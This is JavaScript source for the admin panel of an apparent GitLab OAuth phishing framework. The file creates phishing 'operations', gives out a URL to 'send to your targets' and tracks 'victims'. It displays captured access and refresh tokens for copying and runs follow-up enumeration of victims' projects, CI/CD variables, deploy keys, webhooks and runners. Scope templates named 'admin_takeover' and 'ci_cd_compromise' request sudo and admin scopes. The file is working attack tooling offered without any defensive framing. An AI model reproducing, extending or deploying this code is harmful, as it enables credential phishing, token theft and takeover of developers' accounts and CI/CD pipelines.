/**
 * GitLab Phishing Framework - Admin Panel JavaScript
 * Handles real-time updates, UI interactions, and API calls
 */

// Global state
let currentOperations = [];
let currentVictims = [];
let selectedOperationId = null;
let updateInterval = null;
let TEMPLATES = {}; // Will be loaded from API
let SCOPES = {}; // Will be loaded from API

// Initialize on page load
document.addEventListener('DOMContentLoaded', function() {
    console.log('Admin panel initialized');
    loadTemplatesAndScopes();
    loadInitialData();
    startAutoUpdate();
    
    // Setup copy button event listeners using event delegation
    document.body.addEventListener('click', function(e) {
        if (e.target.classList.contains('notification-url-copy') || 
            e.target.classList.contains('copy-btn')) {
            const textToCopy = e.target.getAttribute('data-copy-text');
            if (textToCopy) {
                copyToClipboard(textToCopy, e.target);
            }
        }
    });
});

// ==================== DATA LOADING ====================

async function loadTemplatesAndScopes() {
    try {
        // Load templates
        const templatesResponse = await fetch('/api/templates');
        TEMPLATES = await templatesResponse.json();
        console.log('Templates loaded:', TEMPLATES);
        
        // Load scopes
        const scopesResponse = await fetch('/api/scopes');
        SCOPES = await scopesResponse.json();
        console.log('Scopes loaded:', Object.keys(SCOPES).length, 'scopes');
        
        // Update scope checkboxes with descriptions from API
        updateScopeDescriptions();
    } catch (error) {
        console.error('Error loading templates and scopes:', error);
        // Fallback to hardcoded templates if API fails
        TEMPLATES = {
            'basic_recon': {
                scopes: ['read_api', 'read_user', 'openid', 'profile', 'email'],
                description: 'Basic reconnaissance - read user profile and API access'
            },
            'advanced_recon': {
                scopes: ['read_api', 'read_repository', 'read_registry', 'read_user'],
                description: 'Advanced reconnaissance - full read access to projects, repos, and registry'
            },
            'full_api_access': {
                scopes: ['api', 'read_user', 'read_repository', 'write_repository'],
                description: 'Full API access - complete API control for advanced operations'
            },
            'admin_takeover': {
                scopes: ['api', 'sudo', 'admin_mode', 'read_user'],
                description: 'Admin takeover - full admin access with sudo capabilities (requires admin OAuth app)'
            },
            'ci_cd_compromise': {
                scopes: ['api', 'read_repository', 'write_repository', 'read_registry', 'write_registry', 'create_runner', 'manage_runner'],
                description: 'CI/CD compromise - read/write access to repositories, registry, and runners'
            },
            'full_access': {
                scopes: ['api', 'sudo', 'admin_mode', 'read_service_ping', 'k8s_proxy'],
                description: 'Full access - complete control over GitLab instance (requires admin OAuth app)'
            }
        };
    }
}

function updateScopeDescriptions() {
    // Update the small description text for each scope checkbox based on API data
    const scopeCheckboxes = document.querySelectorAll('.scope-checkbox');
    scopeCheckboxes.forEach(label => {
        const checkbox = label.querySelector('input[type="checkbox"]');
        const scopeName = checkbox.value;
        const smallTag = label.querySelector('small');
        
        if (SCOPES[scopeName] && smallTag) {
            // Truncate long descriptions for UI
            const description = SCOPES[scopeName];
            const shortDesc = description.length > 50 ? description.substring(0, 47) + '...' : description;
            smallTag.textContent = shortDesc;
            smallTag.title = description; // Full description on hover
        }
    });
}

async function loadInitialData() {
    await Promise.all([
        updateStats(),
        updateOperations(),
        updateVictims()
    ]);
}

async function updateStats() {
    try {
        const response = await fetch('/api/stats');
        const stats = await response.json();
        
        document.getElementById('stat-operations').textContent = stats.total_operations || 0;
        document.getElementById('stat-active').textContent = stats.active_operations || 0;
        document.getElementById('stat-victims').textContent = stats.total_victims || 0;
        document.getElementById('stat-authorized').textContent = stats.authorized_victims || 0;
        document.getElementById('stat-tokens').textContent = stats.total_tokens || 0;
        document.getElementById('stat-projects').textContent = stats.total_projects || 0;
    } catch (error) {
        console.error('Error updating stats:', error);
    }
}

async function updateOperations() {
    try {
        const response = await fetch('/api/operations');
        const operations = await response.json();
        
        currentOperations = operations;
        renderOperationsTable(operations);
        updateOperationFilters(operations);
    } catch (error) {
        console.error('Error updating operations:', error);
    }
}

async function updateVictims() {
    try {
        const operationId = document.getElementById('victim-filter')?.value;
        const url = operationId ? `/api/victims?operation_id=${operationId}` : '/api/victims';
        
        const response = await fetch(url);
        const victims = await response.json();
        
        currentVictims = victims;
        renderVictimsTable(victims);
    } catch (error) {
        console.error('Error updating victims:', error);
    }
}

async function updateActivity() {
    const operationId = document.getElementById('activity-filter')?.value;
    if (!operationId) return;
    
    try {
        const response = await fetch(`/api/activity/${operationId}?limit=50`);
        const activity = await response.json();
        
        renderActivityLog(activity);
    } catch (error) {
        console.error('Error updating activity:', error);
    }
}

// ==================== RENDERING ====================

function renderOperationsTable(operations) {
    const tbody = document.getElementById('operations-tbody');
    
    if (!operations || operations.length === 0) {
        tbody.innerHTML = '<tr><td colspan="9" class="no-data">No operations yet. Create one to get started.</td></tr>';
        return;
    }
    
    tbody.innerHTML = operations.map(op => `
        <tr>
            <td>${op.id}</td>
            <td><strong>${escapeHtml(op.name)}</strong></td>
            <td>${op.instance_type === 'saas' ? 'GitLab SaaS' : 'Self-Managed'}</td>
            <td>${escapeHtml(op.base_url)}</td>
            <td><span class="status-badge status-${op.status}">${op.status}</span></td>
            <td>${getVictimCount(op.id)}</td>
            <td>${getTokenCount(op.id)}</td>
            <td>${formatDate(op.created_at)}</td>
            <td style="white-space: nowrap;">
                ${op.status === 'created' || op.status === 'stopped' ? 
                    `<button class="btn btn-success btn-small" onclick="startOperation(${op.id})">Start</button>` :
                    `<button class="btn btn-danger btn-small" onclick="stopOperation(${op.id})">Stop</button>`
                }
                <button class="btn btn-secondary btn-small" onclick="viewOperationDetails(${op.id})">Details</button>
                ${op.status === 'created' || op.status === 'stopped' ? 
                    `<button class="btn btn-danger btn-small" onclick="deleteOperation(${op.id}, '${escapeHtml(op.name).replace(/'/g, "\\'")}')">Delete</button>` : ''
                }
            </td>
        </tr>
    `).join('');
}

function renderVictimsTable(victims) {
    const tbody = document.getElementById('victims-tbody');
    
    if (!victims || victims.length === 0) {
        tbody.innerHTML = '<tr><td colspan="9" class="no-data">No victims yet.</td></tr>';
        return;
    }
    
    tbody.innerHTML = victims.map(victim => {
        const hasToken = victim.status === 'authorized';
        const tokenDisplay = hasToken ? 
            '<span style="color: #108548;">✓ Captured</span>' : 
            '<span style="color: #666;">Pending</span>';
        
        const actions = hasToken ? `
            <button class="btn btn-success btn-small" onclick="showEnumerationModal(${victim.id}, ${victim.operation_id})">Enumerate</button>
            <button class="btn btn-primary btn-small" onclick="window.location.href='/enumeration/${victim.id}'">View Results</button>
            <button class="btn btn-secondary btn-small" onclick="viewVictimDetails(${victim.id})">Details</button>
            <button class="btn btn-danger btn-small" onclick="deleteVictim(${victim.id}, '${escapeHtml(victim.username || victim.user_code)}')">Delete</button>
        ` : `
            <button class="btn btn-secondary btn-small" onclick="viewVictimDetails(${victim.id})">Details</button>
            <button class="btn btn-danger btn-small" onclick="deleteVictim(${victim.id}, '${escapeHtml(victim.username || victim.user_code)}')">Delete</button>
        `;
        
        return `
            <tr>
                <td>${victim.id}</td>
                <td>${victim.username || '<em>Unknown</em>'}</td>
                <td>${victim.email || '<em>Unknown</em>'}</td>
                <td><code>${victim.user_code}</code></td>
                <td><span class="status-badge status-${victim.status}">${victim.status}</span></td>
                <td>${tokenDisplay}</td>
                <td>${victim.ip_address || 'N/A'}</td>
                <td>${formatDate(victim.created_at)}</td>
                <td style="white-space: nowrap;">
                    ${actions}
                </td>
            </tr>
        `;
    }).join('');
}

function renderActivityLog(activity) {
    const logContainer = document.getElementById('activity-log');
    
    if (!activity || activity.length === 0) {
        logContainer.innerHTML = '<div class="no-data">No activity yet.</div>';
        return;
    }
    
    logContainer.innerHTML = activity.map(item => `
        <div class="activity-item">
            <div class="activity-time">${formatDateTime(item.timestamp)}</div>
            <div class="activity-type">${item.event_type}</div>
            <div class="activity-message">${escapeHtml(item.message)}</div>
        </div>
    `).join('');
}

// ==================== OPERATION ACTIONS ====================

async function createOperation(event) {
    event.preventDefault();
    
    const form = event.target;
    const formData = new FormData(form);
    
    // Get instance type and base URL
    const instanceType = formData.get('instance_type');
    let baseUrl = instanceType === 'saas' ? 'https://gitlab.com' : formData.get('base_url');
    
    // Get selected scopes
    const scopes = Array.from(form.querySelectorAll('input[name="scopes"]:checked'))
        .map(cb => cb.value);
    
    if (scopes.length === 0) {
        showNotification('Validation Error', 'Please select at least one OAuth scope', 'warning');
        return;
    }
    
    const data = {
        name: formData.get('name'),
        instance_type: instanceType,
        base_url: baseUrl,
        client_id: formData.get('client_id'),
        template: formData.get('template') || null,
        scopes: scopes
    };
    
    try {
        const response = await fetch('/api/operations/create', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });
        
        const result = await response.json();
        
        if (response.ok) {
            showNotification(
                'Operation Created!', 
                `Operation "${data.name}" has been created successfully. Click "Start" to begin.`,
                'success'
            );
            closeCreateOperationModal();
            form.reset();
            await updateOperations();
            await updateStats();
        } else {
            showNotification(
                'Error Creating Operation',
                result.error || 'Unknown error occurred',
                'error'
            );
        }
    } catch (error) {
        console.error('Error creating operation:', error);
        showNotification(
            'Error Creating Operation',
            error.message || 'Network error occurred',
            'error'
        );
    }
}

async function startOperation(operationId) {
    // Show confirmation notification instead of alert
    showConfirmation(
        'Start Operation?',
        'Are you sure you want to start this operation? The phishing URL will become active.',
        async () => {
            try {
                const response = await fetch(`/api/operations/${operationId}/start`, {
                    method: 'POST'
                });
                
                const result = await response.json();
                
                if (response.ok) {
                    const phishingUrl = result.data?.phishing_url || `http://${window.location.hostname}:8080/op/${operationId}`;
                    showNotification(
                        'Operation Started!',
                        'The operation is now active. Send this URL to targets:',
                        'success',
                        phishingUrl,
                        10000  // Show for 10 seconds
                    );
                    await updateOperations();
                    await updateStats();
                } else {
                    showNotification(
                        'Error Starting Operation',
                        result.error || 'Unknown error occurred',
                        'error'
                    );
                }
            } catch (error) {
                console.error('Error starting operation:', error);
                showNotification(
                    'Error Starting Operation',
                    error.message || 'Network error occurred',
                    'error'
                );
            }
        }
    );
}

async function stopOperation(operationId) {
    // Show confirmation notification instead of alert
    showConfirmation(
        'Stop Operation?',
        'Are you sure you want to stop this operation? All active polling will be stopped.',
        async () => {
            try {
                const response = await fetch(`/api/operations/${operationId}/stop`, {
                    method: 'POST'
                });
                
                const result = await response.json();
                
                if (response.ok) {
                    showNotification(
                        'Operation Stopped',
                        'The operation has been stopped successfully',
                        'success'
                    );
                    await updateOperations();
                    await updateStats();
                } else {
                    showNotification(
                        'Error Stopping Operation',
                        result.error || 'Unknown error occurred',
                        'error'
                    );
                }
            } catch (error) {
                console.error('Error stopping operation:', error);
                showNotification(
                    'Error Stopping Operation',
                    error.message || 'Network error occurred',
                    'error'
                );
            }
        }
    );
}

async function deleteOperation(operationId, operationName) {
    showConfirmation(
        'Delete Operation?',
        `Are you sure you want to delete operation "${operationName}"? This action cannot be undone and will delete all associated victims, tokens, and activity logs.`,
        async () => {
            try {
                const response = await fetch(`/api/operations/${operationId}/delete`, {
                    method: 'DELETE'
                });
                
                const result = await response.json();
                
                if (response.ok) {
                    showNotification(
                        'Operation Deleted',
                        `Operation "${operationName}" has been deleted successfully`,
                        'success'
                    );
                    await updateOperations();
                    await updateStats();
                    await updateVictims();
                } else {
                    showNotification(
                        'Error Deleting Operation',
                        result.error || 'Unknown error occurred',
                        'error'
                    );
                }
            } catch (error) {
                console.error('Error deleting operation:', error);
                showNotification(
                    'Error Deleting Operation',
                    error.message || 'Network error occurred',
                    'error'
                );
            }
        }
    );
}

async function viewOperationDetails(operationId) {
    try {
        const response = await fetch(`/api/operations/${operationId}`);
        const operation = await response.json();
        
        if (!response.ok) {
            showNotification('Error', 'Failed to load operation details', 'error');
            return;
        }
        
        // Build details HTML
        let html = '<div class="victim-details-section">';
        html += '<h3>Operation Information</h3>';
        html += '<div class="detail-grid">';
        html += `<div class="detail-item"><div class="detail-label">Operation ID</div><div class="detail-value">${operation.id}</div></div>`;
        html += `<div class="detail-item"><div class="detail-label">Name</div><div class="detail-value">${escapeHtml(operation.name)}</div></div>`;
        html += `<div class="detail-item"><div class="detail-label">Status</div><div class="detail-value"><span class="status-badge status-${operation.status}">${operation.status}</span></div></div>`;
        html += `<div class="detail-item"><div class="detail-label">Instance Type</div><div class="detail-value">${operation.instance_type === 'saas' ? 'GitLab SaaS' : 'Self-Managed'}</div></div>`;
        html += `<div class="detail-item"><div class="detail-label">Base URL</div><div class="detail-value">${escapeHtml(operation.base_url)}</div></div>`;
        html += `<div class="detail-item"><div class="detail-label">Client ID</div><div class="detail-value" style="word-break: break-all; overflow-wrap: break-word;"><code style="font-size: 0.75rem;">${escapeHtml(operation.client_id)}</code></div></div>`;
        html += `<div class="detail-item"><div class="detail-label">Template</div><div class="detail-value">${operation.template || 'Custom'}</div></div>`;
        html += `<div class="detail-item"><div class="detail-label">Created</div><div class="detail-value">${formatDateTime(operation.created_at)}</div></div>`;
        html += '</div>';
        
        // Show phishing URL if operation is running
        if (operation.status === 'running' || operation.status === 'authorized' || operation.status === 'enumerating' || operation.status === 'persisting' || operation.status === 'completed') {
            const phishingUrl = `http://${window.location.hostname}:8080/op/${operation.id}`;
            html += '<h3 style="margin-top: 20px;">Phishing URL</h3>';
            html += '<div class="notification-url" style="margin-top: 10px;">';
            html += `<span class="notification-url-text">${escapeHtml(phishingUrl)}</span>`;
            html += `<button class="notification-url-copy" data-copy-text="${escapeHtml(phishingUrl)}">Copy</button>`;
            html += '</div>';
            html += '<p style="margin-top: 10px; color: #666; font-size: 0.9rem;">Send this URL to your targets to begin the phishing campaign.</p>';
        } else if (operation.status === 'created' || operation.status === 'stopped') {
            html += '<div style="margin-top: 20px; padding: 15px; background: #fef5e7; border-left: 4px solid #fc6d26; border-radius: 4px;">';
            html += '<p style="color: #666; margin: 0;">⚠️ This operation is not running. Click "Start" to activate the phishing URL.</p>';
            html += '</div>';
        }
        
        // Show scopes
        html += '<h3 style="margin-top: 20px;">OAuth Scopes</h3>';
        html += '<div style="display: flex; flex-wrap: wrap; gap: 8px; margin-top: 10px;">';
        if (operation.scopes && operation.scopes.length > 0) {
            operation.scopes.forEach(scope => {
                html += `<span style="background: #2d2d2d; padding: 6px 12px; border-radius: 4px; font-size: 0.85rem; border: 1px solid #404040;">${escapeHtml(scope)}</span>`;
            });
        } else {
            html += '<p style="color: #666;">No scopes configured</p>';
        }
        html += '</div>';
        
        html += '</div>';
        
        document.getElementById('victim-details-content').innerHTML = html;
        document.getElementById('victim-details-modal').style.display = 'block';
    } catch (error) {
        console.error('Error viewing operation details:', error);
        showNotification('Error', 'Failed to load operation details: ' + error.message, 'error');
    }
}

// ==================== VICTIM ACTIONS ====================

async function viewVictimDetails(victimId) {
    try {
        const response = await fetch(`/api/victims/${victimId}`);
        const victim = await response.json();
        
        if (!response.ok) {
            showNotification('Error', 'Failed to load victim details', 'error');
            return;
        }
        
        // Build details HTML
        let html = '<div class="victim-details-section">';
        html += '<h3>Basic Information</h3>';
        html += '<div class="detail-grid">';
        html += `<div class="detail-item"><div class="detail-label">Victim ID</div><div class="detail-value">${victim.id}</div></div>`;
        html += `<div class="detail-item"><div class="detail-label">Operation ID</div><div class="detail-value">${victim.operation_id}</div></div>`;
        html += `<div class="detail-item"><div class="detail-label">Username</div><div class="detail-value">${victim.username || 'Unknown'}</div></div>`;
        html += `<div class="detail-item"><div class="detail-label">Email</div><div class="detail-value">${victim.email || 'Unknown'}</div></div>`;
        html += `<div class="detail-item"><div class="detail-label">User Code</div><div class="detail-value"><code>${victim.user_code}</code></div></div>`;
        html += `<div class="detail-item"><div class="detail-label">Status</div><div class="detail-value"><span class="status-badge status-${victim.status}">${victim.status}</span></div></div>`;
        html += `<div class="detail-item"><div class="detail-label">IP Address</div><div class="detail-value">${victim.ip_address || 'N/A'}</div></div>`;
        html += `<div class="detail-item"><div class="detail-label">Created</div><div class="detail-value">${formatDateTime(victim.created_at)}</div></div>`;
        html += '</div>';
        
        // Try to get token
        try {
            const tokenResponse = await fetch(`/api/victims/${victimId}/token`);
            if (tokenResponse.ok) {
                const tokenData = await tokenResponse.json();
                html += '<h3>Access Token</h3>';
                html += '<div class="token-display">';
                if (tokenData && tokenData.access_token) {
                    html += '<div class="token-header">';
                    html += '<span>Access Token</span>';
                    html += `<button class="copy-btn btn btn-small" data-copy-text="${escapeHtml(tokenData.access_token)}">Copy</button>`;
                    html += '</div>';
                    html += `<div class="token-value">${escapeHtml(tokenData.access_token)}</div>`;
                    
                    if (tokenData.refresh_token) {
                        html += '<div class="token-header" style="margin-top: 15px;">';
                        html += '<span>Refresh Token</span>';
                        html += `<button class="copy-btn btn btn-small" data-copy-text="${escapeHtml(tokenData.refresh_token)}">Copy</button>`;
                        html += '</div>';
                        html += `<div class="token-value">${escapeHtml(tokenData.refresh_token)}</div>`;
                    }
                    
                    html += `<div style="margin-top: 10px; color: #666; font-size: 0.85rem;">`;
                    html += `<strong>Scope:</strong> ${escapeHtml(tokenData.scope || 'N/A')}<br>`;
                    html += `<strong>Captured:</strong> ${formatDateTime(tokenData.created_at)}`;
                    html += `</div>`;
                } else {
                    html += '<div class="token-header">';
                    html += '<span>Token not yet captured</span>';
                    html += '</div>';
                }
                html += '</div>';
            } else {
                html += '<h3>Access Token</h3>';
                html += '<div class="token-display">';
                html += '<div class="token-header">';
                html += '<span>Token not yet captured</span>';
                html += '</div>';
                html += '</div>';
            }
        } catch (e) {
            console.error('Error loading token:', e);
            html += '<h3>Access Token</h3>';
            html += '<div class="token-display">';
            html += '<div class="token-header">';
            html += '<span>Error loading token</span>';
            html += '</div>';
            html += '</div>';
        }
        
        html += '</div>';
        
        document.getElementById('victim-details-content').innerHTML = html;
        document.getElementById('victim-details-modal').style.display = 'block';
    } catch (error) {
        console.error('Error viewing victim details:', error);
        showNotification('Error', 'Failed to load victim details: ' + error.message, 'error');
    }
}

// ==================== MODAL FUNCTIONS ====================

function showCreateOperationModal() {
    document.getElementById('create-operation-modal').style.display = 'block';
}

function closeCreateOperationModal() {
    document.getElementById('create-operation-modal').style.display = 'none';
}

function closeVictimDetailsModal() {
    document.getElementById('victim-details-modal').style.display = 'none';
}

function showResetDatabaseModal() {
    document.getElementById('reset-database-modal').style.display = 'block';
    document.getElementById('reset-confirmation-input').value = '';
    document.getElementById('confirm-reset-button').disabled = true;
}

function closeResetDatabaseModal() {
    document.getElementById('reset-database-modal').style.display = 'none';
    document.getElementById('reset-confirmation-input').value = '';
}

let currentVictimForEnumeration = null;
let currentOperationForEnumeration = null;

function showEnumerationModal(victimId, operationId) {
    currentVictimForEnumeration = victimId;
    currentOperationForEnumeration = operationId;
    document.getElementById('enumeration-modal').style.display = 'block';
}

function closeEnumerationModal() {
    document.getElementById('enumeration-modal').style.display = 'none';
    currentVictimForEnumeration = null;
    currentOperationForEnumeration = null;
}

async function startEnumeration(event) {
    event.preventDefault();
    
    if (!currentVictimForEnumeration || !currentOperationForEnumeration) {
        showNotification('Error', 'No victim selected', 'error');
        return;
    }
    
    const form = event.target;
    const formData = new FormData(form);
    
    const options = {
        enum_user: formData.get('enum_user') === 'true',
        enum_projects: formData.get('enum_projects') === 'true',
        enum_groups: formData.get('enum_groups') === 'true',
        enum_snippets: formData.get('enum_snippets') === 'true',
        enum_merge_requests: formData.get('enum_merge_requests') === 'true',
        enum_issues: formData.get('enum_issues') === 'true',
        enum_ci_variables: formData.get('enum_ci_variables') === 'true',
        enum_ssh_keys: formData.get('enum_ssh_keys') === 'true',
        enum_webhooks: formData.get('enum_webhooks') === 'true',
        enum_runners: formData.get('enum_runners') === 'true'
    };
    
    // Save victim and operation IDs before closing modal
    const victimId = currentVictimForEnumeration;
    const operationId = currentOperationForEnumeration;
    
    // Close enumeration options modal
    closeEnumerationModal();
    
    // Show progress modal
    showEnumerationProgressModal(options);
    
    try {
        const response = await fetch(`/api/victims/${victimId}/enumerate`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(options)
        });
        
        const result = await response.json();
        
        if (response.ok) {
            // Start monitoring enumeration progress
            monitorEnumerationProgress(victimId, operationId, options);
        } else {
            addEnumerationLog('Error: ' + (result.error || 'Unknown error occurred'), 'error');
            updateEnumerationStatus('Enumeration failed');
            updateEnumerationProgress(100);
            document.getElementById('enumeration-close-button').disabled = false;
        }
    } catch (error) {
        console.error('Error starting enumeration:', error);
        addEnumerationLog('Error: ' + (error.message || 'Network error occurred'), 'error');
        updateEnumerationStatus('Enumeration failed');
        updateEnumerationProgress(100);
        document.getElementById('enumeration-close-button').disabled = false;
    }
}

function showEnumerationProgressModal(options) {
    // Reset modal state
    document.getElementById('enumeration-progress-bar').style.width = '0%';
    document.getElementById('enumeration-progress-bar').textContent = '0%';
    document.getElementById('enumeration-status').textContent = 'Initializing enumeration...';
    document.getElementById('enumeration-log').innerHTML = '';
    document.getElementById('enumeration-close-button').disabled = true;
    document.getElementById('enumeration-view-results-button').style.display = 'none';
    
    // Show modal
    document.getElementById('enumeration-progress-modal').style.display = 'block';
    
    // Add initial log entry
    addEnumerationLog('Starting enumeration...', 'info');
    
    // Log selected options
    if (options.enum_user) addEnumerationLog('✓ User information enumeration enabled', 'info');
    if (options.enum_projects) addEnumerationLog('✓ Projects enumeration enabled', 'info');
    if (options.enum_groups) addEnumerationLog('✓ Groups enumeration enabled', 'info');
    if (options.enum_snippets) addEnumerationLog('✓ Snippets enumeration enabled', 'info');
    if (options.enum_merge_requests) addEnumerationLog('✓ Merge requests enumeration enabled', 'info');
    if (options.enum_issues) addEnumerationLog('✓ Issues enumeration enabled', 'info');
    if (options.enum_ci_variables) addEnumerationLog('✓ CI/CD variables enumeration enabled', 'info');
    if (options.enum_ssh_keys) addEnumerationLog('✓ Deploy keys enumeration enabled', 'info');
    if (options.enum_webhooks) addEnumerationLog('✓ Webhooks enumeration enabled', 'info');
    if (options.enum_runners) addEnumerationLog('✓ CI/CD runners enumeration enabled', 'info');
}

function closeEnumerationProgressModal() {
    document.getElementById('enumeration-progress-modal').style.display = 'none';
}

function addEnumerationLog(message, type = 'info') {
    const logContainer = document.getElementById('enumeration-log');
    const entry = document.createElement('div');
    entry.className = `log-entry ${type}`;
    entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
    logContainer.appendChild(entry);
    
    // Auto-scroll to bottom
    logContainer.scrollTop = logContainer.scrollHeight;
}

function updateEnumerationStatus(status) {
    document.getElementById('enumeration-status').textContent = status;
}

function updateEnumerationProgress(percentage) {
    const progressBar = document.getElementById('enumeration-progress-bar');
    progressBar.style.width = percentage + '%';
    progressBar.textContent = Math.round(percentage) + '%';
}

let enumerationMonitorInterval = null;
let lastEnumeratedVictimId = null;
let seenActivityIds = new Set();

async function monitorEnumerationProgress(victimId, operationId, options) {
    let progress = 10;
    let isComplete = false;
    
    // Save victim ID for later use
    lastEnumeratedVictimId = victimId;
    seenActivityIds.clear();
    
    if (Object.values(options).filter(v => v === true).length === 0) {
        addEnumerationLog('No enumeration options selected', 'warning');
        updateEnumerationStatus('Completed');
        updateEnumerationProgress(100);
        document.getElementById('enumeration-close-button').disabled = false;
        return;
    }
    
    // Initial progress
    updateEnumerationProgress(progress);
    
    // Monitor activity log
    enumerationMonitorInterval = setInterval(async () => {
        if (isComplete) {
            clearInterval(enumerationMonitorInterval);
            return;
        }
        
        try {
            // Fetch activity log
            const response = await fetch(`/api/activity/${operationId}?limit=20`);
            const activities = await response.json();
            
            // Process new activities
            for (const activity of activities) {
                if (seenActivityIds.has(activity.id)) continue;
                seenActivityIds.add(activity.id);
                
                const eventType = activity.event_type;
                const message = activity.message;
                
                // Handle different event types
                if (eventType === 'enumeration_started') {
                    addEnumerationLog('Enumeration started', 'info');
                    updateEnumerationStatus('Enumerating resources...');
                    progress = 20;
                    updateEnumerationProgress(progress);
                    
                } else if (eventType === 'enumeration_complete') {
                    addEnumerationLog(message, 'success');
                    updateEnumerationStatus('✓ Enumeration completed successfully!');
                    progress = 100;
                    updateEnumerationProgress(progress);
                    document.getElementById('enumeration-close-button').disabled = false;
                    document.getElementById('enumeration-view-results-button').style.display = 'inline-block';
                    isComplete = true;
                    await updateVictims();
                    await updateStats();
                    
                } else if (eventType === 'enumeration_error') {
                    addEnumerationLog(message, 'error');
                    updateEnumerationStatus('✗ Enumeration failed');
                    progress = 100;
                    updateEnumerationProgress(progress);
                    document.getElementById('enumeration-close-button').disabled = false;
                    isComplete = true;
                }
            }
            
            // Gradually increment progress if not complete
            if (!isComplete && progress < 70) {
                progress += 2;
                updateEnumerationProgress(progress);
            }
            
        } catch (error) {
            console.error('Error monitoring enumeration:', error);
        }
    }, 1000); // Check every second for better responsiveness
    
    // Timeout after 2 minutes
    setTimeout(() => {
        if (enumerationMonitorInterval && !isComplete) {
            clearInterval(enumerationMonitorInterval);
            addEnumerationLog('Monitoring timed out', 'warning');
            updateEnumerationStatus('Timeout - check activity log for details');
            updateEnumerationProgress(100);
            document.getElementById('enumeration-close-button').disabled = false;
            document.getElementById('enumeration-view-results-button').style.display = 'inline-block';
        }
    }, 120000);
}

async function viewEnumerationResults() {
    closeEnumerationProgressModal();
    
    // Use the saved victim ID
    if (lastEnumeratedVictimId) {
        await viewVictimDetails(lastEnumeratedVictimId);
    } else {
        showNotification('Error', 'No enumeration results available', 'error');
    }
}

function redirectToEnumerationResults() {
    if (lastEnumeratedVictimId) {
        window.location.href = `/enumeration/${lastEnumeratedVictimId}`;
    } else {
        showNotification('Error', 'No enumeration results available', 'error');
    }
}

function toggleAllEnumOptions(checked) {
    const checkboxes = document.querySelectorAll('.enum-option');
    checkboxes.forEach(cb => {
        cb.checked = checked;
    });
}

async function deleteVictim(victimId, victimName) {
    showConfirmation(
        'Delete Victim?',
        `Are you sure you want to delete victim "${victimName}"? This will delete all associated data including tokens and enumeration results.`,
        async () => {
            try {
                const response = await fetch(`/api/victims/${victimId}/delete`, {
                    method: 'DELETE'
                });
                
                const result = await response.json();
                
                if (response.ok) {
                    showNotification(
                        'Victim Deleted',
                        `Victim "${victimName}" has been deleted successfully`,
                        'success'
                    );
                    await updateVictims();
                    await updateStats();
                } else {
                    showNotification(
                        'Error Deleting Victim',
                        result.error || 'Unknown error occurred',
                        'error'
                    );
                }
            } catch (error) {
                console.error('Error deleting victim:', error);
                showNotification(
                    'Error Deleting Victim',
                    error.message || 'Network error occurred',
                    'error'
                );
            }
        }
    );
}

function closeEnumerationResultsModal() {
    document.getElementById('enumeration-results-modal').style.display = 'none';
}

function checkResetConfirmation() {
    const input = document.getElementById('reset-confirmation-input');
    const button = document.getElementById('confirm-reset-button');
    
    if (input.value === 'DELETE ALL DATA') {
        button.disabled = false;
    } else {
        button.disabled = true;
    }
}

async function resetDatabase() {
    const input = document.getElementById('reset-confirmation-input');
    
    if (input.value !== 'DELETE ALL DATA') {
        showNotification('Error', 'Please type DELETE ALL DATA to confirm', 'error');
        return;
    }
    
    try {
        const response = await fetch('/api/database/reset', {
            method: 'POST'
        });
        
        const result = await response.json();
        
        if (response.ok) {
            showNotification(
                'Database Reset',
                'All data has been permanently deleted. The page will reload.',
                'success',
                null,
                3000
            );
            closeResetDatabaseModal();
            
            // Reload page after 3 seconds
            setTimeout(() => {
                window.location.reload();
            }, 3000);
        } else {
            showNotification(
                'Error Resetting Database',
                result.error || 'Unknown error occurred',
                'error'
            );
        }
    } catch (error) {
        console.error('Error resetting database:', error);
        showNotification(
            'Error Resetting Database',
            error.message || 'Network error occurred',
            'error'
        );
    }
}

// Close modals when clicking outside
window.onclick = function(event) {
    const createModal = document.getElementById('create-operation-modal');
    const victimModal = document.getElementById('victim-details-modal');
    const resetModal = document.getElementById('reset-database-modal');
    const enumModal = document.getElementById('enumeration-modal');
    const enumProgressModal = document.getElementById('enumeration-progress-modal');
    const enumResultsModal = document.getElementById('enumeration-results-modal');
    
    if (event.target === createModal) {
        closeCreateOperationModal();
    }
    if (event.target === victimModal) {
        closeVictimDetailsModal();
    }
    if (event.target === resetModal) {
        closeResetDatabaseModal();
    }
    if (event.target === enumModal) {
        closeEnumerationModal();
    }
    if (event.target === enumResultsModal) {
        closeEnumerationResultsModal();
    }
    // Don't allow closing progress modal by clicking outside
}

// ==================== FORM HELPERS ====================

function toggleBaseUrl() {
    const instanceType = document.getElementById('op-instance-type').value;
    const baseUrlGroup = document.getElementById('base-url-group');
    const baseUrlInput = document.getElementById('op-base-url');
    
    if (instanceType === 'self-managed') {
        baseUrlGroup.style.display = 'block';
        baseUrlInput.required = true;
    } else {
        baseUrlGroup.style.display = 'none';
        baseUrlInput.required = false;
    }
}

function updateScopeAvailability(instanceType) {
    // All scopes are available for both SaaS and Self-Managed
    // The availability depends on the OAuth application permissions, not the instance type
    // No scopes need to be disabled based on instance type
}

function loadTemplate() {
    const templateSelect = document.getElementById('op-template');
    const template = templateSelect.value;
    const descriptionEl = document.getElementById('template-description');
    
    // Clear all checkboxes first (except disabled ones)
    document.querySelectorAll('input[name="scopes"]').forEach(cb => {
        if (!cb.disabled) {
            cb.checked = false;
        }
    });
    
    if (template && TEMPLATES[template]) {
        const templateData = TEMPLATES[template];
        
        // Set description
        descriptionEl.textContent = templateData.description;
        descriptionEl.style.display = 'block';
        descriptionEl.style.marginTop = '8px';
        descriptionEl.style.color = '#666';
        descriptionEl.style.fontStyle = 'italic';
        
        // Check appropriate scopes (only if not disabled)
        templateData.scopes.forEach(scope => {
            const checkbox = document.querySelector(`input[name="scopes"][value="${scope}"]`);
            if (checkbox && !checkbox.disabled) {
                checkbox.checked = true;
            }
        });
    } else {
        descriptionEl.textContent = '';
        descriptionEl.style.display = 'none';
    }
}

// ==================== FILTERS ====================

function updateOperationFilters(operations) {
    const victimFilter = document.getElementById('victim-filter');
    const activityFilter = document.getElementById('activity-filter');
    
    const currentVictimValue = victimFilter.value;
    const currentActivityValue = activityFilter.value;
    
    // Update victim filter
    victimFilter.innerHTML = '<option value="">All Operations</option>';
    operations.forEach(op => {
        victimFilter.innerHTML += `<option value="${op.id}">${escapeHtml(op.name)}</option>`;
    });
    victimFilter.value = currentVictimValue;
    
